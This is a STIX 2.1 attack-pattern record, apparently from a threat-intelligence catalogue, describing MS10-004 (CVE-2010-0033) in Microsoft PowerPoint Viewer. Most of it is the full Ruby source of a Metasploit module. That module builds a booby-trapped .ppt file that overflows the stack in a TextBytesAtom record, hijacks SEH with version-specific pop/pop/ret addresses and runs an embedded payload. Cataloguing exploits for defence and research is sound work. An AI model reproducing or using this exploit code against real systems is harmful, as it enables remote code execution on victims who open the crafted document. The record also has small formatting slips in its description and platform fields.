{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a98eeb05-2223-4588-a332-f78e3bc943a6",
    "created": "2024-08-14T16:36:23.414923Z",
    "modified": "2024-08-14T16:36:23.414927Z",
    "name": "MS10-004 Microsoft PowerPoint Viewer TextBytesAtom Stack Buffer Overflow",
    "description": " This module exploits a stack buffer overflow vulnerability in the handling of the TextBytesAtom records by Microsoft PowerPoint Viewer. According to Microsoft the PowerPoint Viewer distributed with Office 2003 SP3 and earlier, as well as Office 2004 for Mac, are vulnerable.  NOTE: The vulnerable code path is not reachable on versions of Windows prior to Windows Vista.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/ms10_004_textbytesatom.rb",
            "external_id": "ms10_004_textbytesatom.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-0033"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/ole'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS10-004 Microsoft PowerPoint Viewer TextBytesAtom Stack Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow vulnerability in the handling of\n        the TextBytesAtom records by Microsoft PowerPoint Viewer. According to Microsoft,\n        the PowerPoint Viewer distributed with Office 2003 SP3 and earlier, as well as\n        Office 2004 for Mac, are vulnerable.\n\n        NOTE: The vulnerable code path is not reachable on versions of Windows prior to\n        Windows Vista.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'SkD',   # original discovery\n          'Snake', # PoC\n          'jduck'  # metasploit version\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2010-0033' ],\n          [ 'OSVDB', '62241' ],\n          [ 'MSB', 'MS10-004' ],\n          [ 'ZDI', '10-017' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'DisablePayloadHandler' => true\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\\x00\",\n          'DisableNops'   => true # no need\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # Tested with various patch levels of PowerPoint Viewer 2003 (v6.0.2600.0)\n          [ 'Microsoft PowerPoint Viewer 2003',\n            {\n              'SEHOffset' => 132,\n              'PopPopRet' => 0x30056471 # pop/pop/ret from PPTVIEW.exe v11.0.5703.0\n            }\n          ],\n\n          [ 'Microsoft PowerPoint Viewer 2003 (kb949041 or kb956500) or Office 2003 SP3',\n            {\n              'SEHOffset' => 132,\n              'PopPopRet' => 0x3003c767 # pop/pop/ret from PPTVIEW.exe v11.0.8164.0\n            }\n          ],\n\n=begin\n          #\n          # This is commented out because of ASLR. gdiplus is no good.\n          #\n          [ 'Microsoft PowerPoint Viewer 2003 (kb956500 or kb969615)',\n            {\n              'SEHOffset' => 132,\n              #'PopPopRet' => 0x39827475 # pop/pop/ret from gdiplus.dll v11.0.8230.0\n              'PopPopRet' => 0x69647475\n            }\n          ],\n=end\n\n          [ 'Microsoft PowerPoint Viewer 2003 (kb969615)',\n            {\n              'SEHOffset' => 132,\n              'PopPopRet' => 0x300566d1 # pop/pop/ret from PPTVIEW.exe v11.0.8305.0\n            }\n          ],\n\n          #\n          # All that is needed for new targets are the two vars! msfpescan will help.\n          #\n\n          # crash on a deref path to heaven.\n          [ 'Crash Target for Debugging',\n            {\n              'SEHOffset' => 132,\n              'PopPopRet' => 0xdac0ffee\n            }\n          ]\n        ],\n      'DisclosureDate' => '2010-02-09'))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The file name.',  'msf.ppt']),\n        OptString.new('OUTPUTPATH', [ true, 'Path to output the file', Msf::Config.local_directory ])\n      ])\n  end\n\n  def ppt_record(tag, data=nil, ver=0, inst=0)\n    data ||= ''\n    ret = ''\n    verinst = (ver & 0xf) | (inst << 4)\n    ret << [verinst, tag, data.length].pack('vvV')\n    ret << data\n    ret\n  end\n\n  def exploit\n\n    print_status(\"Creating PowerPoint Document ...\")\n\n    username = Rex::Text.rand_text_alphanumeric(8+rand(8))\n\n    # smash the stack, hit SEH, use the pop-pop-ret to execute code on the stack\n    sploit = rand_text(target['SEHOffset'])\n    sploit << generate_seh_record(target['PopPopRet'])\n    # jump ahead into the next atom\n    distance = 10\n    sploit << Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $+\" + distance.to_s).encode_string\n\n    # TextBytesAtom\n    text_bytes_atom = ppt_record(0xfa8, sploit)\n    text_bytes_atom[4,4] = [0xffffffff].pack('V') # ..f8 thru ..ff\n    #text_bytes_atom << ppt_record(0xfa8, \"\\xcc\" + (\"A\" * 2046) + \"\\xcc\")\n    text_bytes_atom << ppt_record(0xfa8, (\"A\" * 16) + payload.encoded)\n\n\n    # SlidePersistAtom\n    spa1_data = [2,0,0,0x80000000,0].pack('VVVVV')\n    spa1 = ppt_record(0x3f3, spa1_data)\n\n    # SlideListWithText (first)\n    slwt1 = ppt_record(0xff0, spa1, 15, 1)\n\n    # SlidePersistAtom\n    spa2_data = ''\n    spa2_data << [3,0,2,0x100,0].pack('VVVVV')\n\n    # SlideListWithText container (2nd)\n    slwt2_data = ''\n    slwt2_data << ppt_record(0x3f3, spa2_data)\n    # TextHeaderAtom\n    txt_hdr_data = [6].pack('V') # textType\n    slwt2_data << ppt_record(0xf9f, txt_hdr_data)\n    slwt2_data << text_bytes_atom\n    slwt2 = ppt_record(0xff0, slwt2_data, 15)\n\n\n    # Document container\n    doc_data = ''\n    doc_data << slwt1\n    doc_data << slwt2\n    doc = ppt_record(0x3e8, doc_data, 15)\n\n\n    # MainMaster container\n    mdc_data = ppt_record(0xf003, '', 15)\n    ppd_data = ppt_record(0xf002, mdc_data, 15)\n\n    # TextMasterStyleAtom\n    tmsa_data = [0].pack('v') # cLevels (none)\n\n    mm_data = ''\n    mm_data << ppt_record(0xfa3, tmsa_data)\n    mm_data << ppt_record(0x40c, ppd_data, 15)\n    mm = ppt_record(0x3f8, mm_data, 15)\n\n\n    # assembled stream contents\n    content = ''\n\n    document_offset = content.length\n    content << doc\n\n    main_master_offset = content.length\n    content << mm\n\n    # PersistPtrIncrementalBlock\n    start_num = 1\n    count = 2\n    ppib_data = [(start_num & 0xfffff) | (count << 20)].pack('V')\n    ppib_data << [document_offset].pack('V')\n    ppib_data << [main_master_offset].pack('V')\n    ppib = ppt_record(0x1772, ppib_data)\n\n    # Store offset and add it\n    persist_ptr_incremental_block_offset = content.length\n    content << ppib\n\n    # UserEditAtom\n    uea_data = ''\n    uea_data << [0x100].pack('V')         # lastSlideIdRef\n    uea_data << [0x1599,0,3].pack('vCC')  # version, minorVer, majorVer\n    uea_data << [0].pack('V')             # offsetLastEdit\n    uea_data << [persist_ptr_incremental_block_offset].pack('V')\n    uea_data << [1].pack('V')             # docPersistIdRef\n    uea_data << [3].pack('V')             # persistIdSeed\n    uea_data << [1].pack('v')             # lastView\n    uea_data << [0x31c5].pack('v')        # unused??\n    uea = ppt_record(0xff5, uea_data)\n\n    # Store offset and add it\n    user_edit_atom_offset = content.length\n    content << uea\n\n\n    # Create the output file\n    out = File.join(datastore['OUTPUTPATH'], datastore['FILENAME'])\n    stg = Rex::OLE::Storage.new(out, Rex::OLE::STGM_WRITE)\n    if (not stg)\n      fail_with(Failure::Unknown, 'Unable to create output file')\n    end\n\n    # PowerPoint Document stream\n    stm = stg.create_stream(\"PowerPoint Document\")\n    if (not stm)\n      fail_with(Failure::Unknown, 'Unable to create \"PowerPoint Document\" stream')\n    end\n    stm << content\n    stm.close\n\n\n    # CurrentUserAtom stream\n    cua_data = ''\n    cua_data << [0x14].pack('V')        # size\n    cua_data << [0xe391c05f].pack('V')  # headerToken (not encrypted)\n    cua_data << [user_edit_atom_offset].pack('V')\n    cua_data << [username.length].pack('v')\n    cua_data << [0x3f4].pack('v')       # docFileVersion\n    cua_data << [3,0].pack('CC')        # majorVer, minorVer\n    cua_data << [0x3b].pack('v')        # unused??\n    cua_data << username\n    cua_data << [8].pack('V')           # relVersion (1 master slide)\n    cua_data << Rex::Text.to_unicode(username)\n\n    current_user_stream = ppt_record(0xff6, cua_data)\n\n    stm = stg.create_stream(\"Current User\")\n    if (not stm)\n      fail_with(Failure::Unknown, 'Unable to create \"Current User\" stream')\n    end\n    stm << current_user_stream\n    stm.close\n\n    stg.close\n\n    print_status(\"Generated output file #{out}\")\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-02-09",
    "x_mitre_platforms": [
        "win'"
    ]
}